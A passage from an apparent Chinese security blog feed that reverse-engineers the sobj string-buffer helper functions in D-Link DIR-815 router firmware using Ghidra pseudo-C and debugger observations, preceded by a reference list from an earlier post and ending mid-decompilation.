<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.anquanke.com/post/id/179510#h3-8" target="_blank" rel="noopener">路由器漏洞挖掘之 DIR-815 栈溢出漏洞分析</a></p>
<p><a href="https://www.anquanke.com/post/id/187443#h2-9" target="_blank" rel="noopener">IOT设备漏洞挖掘从入门到入门（二）- DLink Dir 815漏洞分析及三种方式模拟复现</a></p>
<p><a href="https://kirin-say.top/2019/02/23/Building-MIPS-Environment-for-Router-PWN/#Run-POC-amp-amp-反弹get-shell" target="_blank" rel="noopener">Building MIPS Environment for Router &amp;&amp; PWN</a> </p>
<p><a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">http://shell-storm.org/shellcode/</a> </p>
<p><a href="http://xdxd.love/2016/12/09/一个mips栈溢出利用/" target="_blank" rel="noopener">一个mips栈溢出</a></p>
]]></content>
      <categories>
        <category>iot</category>
      </categories>
      <tags>
        <tag>dlink</tag>
        <tag>dir-815</tag>
      </tags>
  </entry>
  <entry>
    <title>D-Link中sobj类函数逆向分析</title>
    <url>/2020/05/19/d-linkzhong-sobj-lei-han-shu-ni-xiang-fen-xi/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前调试漏洞的时候都是直接根据官方公告或者别人的帖子直接定位漏洞函数，没有具体分析程序中涉及到的其他也挺重要的函数，这样看起来速度挺快，其实之后还会遇到这些函数，所以还是要仔细分析这些函数。</p>
<p>这次选择了D-Link路由器中的sobj类函数：sobj_new()、sobj_add_char()、sobj_strcmp()、sobj_add_string()、sobj_get_string()等进行分析。</p>
<p>这次分析选择D-Link DIR815固件文件系统中的<code>./htdocs/cgibin</code>，利用qemu的用户模式和IDA\gdb-multiarch联调一步步分析汇编源码，同时结合ghidra反汇编的伪C代码分析。</p>
<p>固件版本：DIR-815 FW 1.01b14_1.01b14.bin</p>
<h1 id="sobj类函数"><a href="#sobj类函数" class="headerlink" title="sobj类函数"></a>sobj类函数</h1><h2 id="sobj-new"><a href="#sobj-new" class="headerlink" title="sobj_new()"></a>sobj_new()</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">sobj_new</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>malloc_addr<span class="token punctuation">;</span>

  malloc_addr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>pvVar1 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>heap<span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>heap<span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>heap<span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>heap<span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>heap<span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">=</span>malloc_addr <span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>heap<span class="token operator">=</span>malloc_addr <span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>gdb-multiarch联调发现执行完sobj_new之后返回值放在v0中。v0 = 0x42e048</p>
<p><img src="sobj_new().png" alt=""></p>
<p>根据sobj_new函数来看出申请了0x18字节的堆空间作为结构体空间，其偏移0x0,0x4处存放对应分配的首地址。 （根据后续的分析得知：0x14处存放的是<strong>malloc/realloc返回的地址也就是申请存放字符串的堆栈空间</strong>，0x10处存放<strong>当前使用的字节数即进行拷贝过的字节数</strong>，0xc处存放*<em>当前申请的总长度减去1字节(减去的一字节代表空字节) *</em> ）</p>
<h2 id="FUN-0040e864"><a href="#FUN-0040e864" class="headerlink" title="FUN_0040e864()"></a>FUN_0040e864()</h2><p>该函数在sobj_add_char()和sobj_add_string()中有调用，参数是sobj_new()申请的结构体地址。</p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">FUN_0040e864</span><span class="token punctuation">(</span><span class="token keyword">int</span> malloc_addr<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>pvVar1<span class="token punctuation">;</span>
  <span class="token keyword">int</span> iVar2<span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>malloc_addr <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//如果0x14处为0</span>
      <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr <span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>
      pvVar1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">=</span> pvVar1<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
      iVar2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr <span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr <span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span> <span class="token operator">=</span> iVar2 <span class="token operator">+</span> <span class="token number">0x20</span><span class="token punctuation">;</span>
      pvVar1 <span class="token operator">=</span> <span class="token function">realloc</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span><span class="token punctuation">,</span>iVar2 <span class="token operator">+</span> <span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//最后一个为空字节NULL</span>
      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">=</span> pvVar1<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//还要判断上面realloc的返回地址是否为0</span>
      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>该函数的作用就是在sobj_new()申请的结构体0x14处malloc/remalloc一个0x21的堆空间，然后将0xc处内容加上0x20。</p>
<h2 id="sobj-add-char-int-malloc-addr-undefined-c"><a href="#sobj-add-char-int-malloc-addr-undefined-c" class="headerlink" title="sobj_add_char(int malloc_addr,undefined c)"></a>sobj_add_char(int malloc_addr,undefined c)</h2><p>该函数的参数有两个：之前sobj_new()申请的结构体首地址malloc_addr，需要add的字符c</p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">sobj_add_char</span><span class="token punctuation">(</span><span class="token keyword">int</span> malloc_addr<span class="token punctuation">,</span>undefined c<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>
  undefined4 uVar2<span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>malloc_addr<span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">||</span>
     <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr<span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr<span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">=</span> <span class="token function">FUN_0040e864</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> iVar1 <span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//申请的字节数等于拷贝的字节数并且申请空间失败则退出</span>
  <span class="token punctuation">{</span>
    uVar2 <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token punctuation">{</span>
    iVar1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr<span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//0x10处加一</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr<span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr<span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> c<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//申请的堆栈空间加上新的字符串c</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr<span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">=</span> iVar1<span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr<span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">+</span> iVar1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    uVar2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> uVar2<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>可以看下运行完一次sobj_add_char之后的结果:</p>
<p><img src="sobj_add_char()1.png" alt=""></p>
<p>运行玩一次之后0x10处为1,0x14处显示的申请的remalloc/malloc的地址，0xc处显示的0x20。</p>
<p><img src="sobj_add_char()2.png" alt=""></p>
<p>并且0x14处的堆地址空间内添加了第一个字符’u’。</p>
<h2 id="sobj-add-string"><a href="#sobj-add-string" class="headerlink" title="sobj_add_string()"></a>sobj_add_string()</h2><p>该函数的参数有两个：目的字符串地址deststr也是sobj_new()申请的结构体地址，需要add的字符串地址sourcestr</p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">sobj_add_string</span><span class="token punctuation">(</span><span class="token keyword">int</span> deststr<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>sourcestr<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  size_t len_of_source<span class="token punctuation">;</span>
  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>
  undefined4 len_of_return<span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>deststr <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    len_of_return <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token punctuation">{</span>
    len_of_return <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>sourcestr <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      len_of_source <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>sourcestr<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//获取的第二个参数的长度</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>len_of_source <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        len_of_return <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">do</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//如果需要拷贝的字符串长度小于0xc（总长度）-0x10（已经拷贝过的长度），直接strcpy即可</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>len_of_source <span class="token operator">&lt;=</span> <span class="token punctuation">(</span>uint<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>deststr <span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>deststr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>deststr <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>deststr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>sourcestr<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>deststr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>deststr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> len_of_source<span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
          iVar1 <span class="token operator">=</span> <span class="token function">FUN_0040e864</span><span class="token punctuation">(</span>deststr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//否则不断申请加0x20直到能够strcpy，每次成功都是返回ivar = 0</span>
          len_of_return <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&lt;</span> iVar1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//如果上面的FUN_0040e864(deststr)出错ivar=-1</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> len_of_return<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>所以通过继续分析sobj_add_string/sobj_add_char函数得知，其sobj_new返回的结构体中0x10存放<strong>当前使用的字节数即进行拷贝过的字节数</strong>，0xc处存放<strong>当前申请的总长度减去1字节(代表空字节)</strong>，0x14存放<strong>malloc/realloc返回的地址也就是申请存放字符串的堆栈空间</strong>，而且每次会将需求拷贝字符串的长度与总长度减去已用长度得到可用长度进行比较决定是否需要再次申请空间，而strcpy的deststr为malloc/remalloc分配的地址加上已用字节数得到。   </p>
<h2 id="sobj-free-int-param-1"><a href="#sobj-free-int-param-1" class="headerlink" title="sobj_free(int param_1)"></a>sobj_free(int param_1)</h2><p>该函数只有一个参数就是sobj_new()的结构体地址</p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">sobj_free</span><span class="token punctuation">(</span><span class="token keyword">int</span> param_1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  undefined4 uVar1<span class="token punctuation">;</span>

  uVar1 <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>param_1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//先看0x14上申请的堆空间是否为空</span>
      <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//不为空释放</span>
    <span class="token punctuation">}</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    uVar1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> uVar1<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>没什么好说的释放空间并清0 </p>
<h2 id="sobj-del-void-param-1"><a href="#sobj-del-void-param-1" class="headerlink" title="sobj_del(void *param_1)"></a>sobj_del(void *param_1)</h2><p>该函数只有一个参数就是sobj_new()的结构体地址</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">sobj_del</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>param_1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>param_1 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>param_1 <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>param_1 <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
                    <span class="token comment" spellcheck="true">/* WARNING: Could not recover jumptable at 0x0040e77c. Too many branches */</span>
                    <span class="token comment" spellcheck="true">/* WARNING: Treating indirect jump as call */</span>
    <span class="token function">free</span><span class="token punctuation">(</span>param_1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>清空sobj_new()的0x14处的堆，之后再清空自身。   </p>
<h2 id="sobj-strcmp-string-new-amp-DAT-0041a5d8"><a href="#sobj-strcmp-string-new-amp-DAT-0041a5d8" class="headerlink" title="sobj_strcmp(string_new,&amp;DAT_0041a5d8)"></a>sobj_strcmp(string_new,&amp;DAT_0041a5d8)</h2><p>该函数有两个参数：string_new是sobj_new()的结构体地址，&amp;DAT_0041a5d8是’uid’的地址。Ghidra反汇编结果如下：</p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">sobj_strcmp</span><span class="token punctuation">(</span><span class="token keyword">int</span> param_1<span class="token punctuation">)</span>

<span class="token punctuation">{</span>
  undefined4 uVar1<span class="token punctuation">;</span>
  <span class="token keyword">int</span> iVar2<span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>param_1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    iVar2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar2 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      iVar2 <span class="token operator">=</span> <span class="token number">0x419b10</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span>iVar2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
